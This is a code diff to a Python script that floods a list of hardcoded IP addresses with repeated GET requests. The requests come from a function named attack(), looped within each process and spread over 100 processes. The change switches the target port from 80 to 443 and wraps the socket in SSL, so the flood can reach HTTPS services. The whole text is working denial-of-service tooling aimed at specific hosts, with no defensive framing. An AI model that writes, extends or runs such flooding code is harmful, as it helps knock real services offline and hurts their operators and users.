@@ -16,7 +16,7 @@ s.connect((ADDR))
 hostname = s.recv(SIZE).decode(FORMAT)
 ip = ["54.169.29.80", "3.0.13.148", "54.255.82.52", "54.254.129.122"]
 s.close()
-port = int(80)
+port = int(443)
 protocol = str("GET")
 
 useragents = [""]
@@ -42,11 +42,12 @@ def attack():
         s.connect((c_ip, port))
         num_sent = num_sent + 1
         print("[+] Sent ", num_sent, " => ", c_ip , ":", port)
+        x = ssl.wrap_socket(s)
         try:
             for i in range (100):
-                s.send(str.encode(request))
+                x.send(str.encode(request))
         except:
-            s.close()
+            x.close()
 
 for y in range(100):
     th = multiprocessing.Process (target=attack)
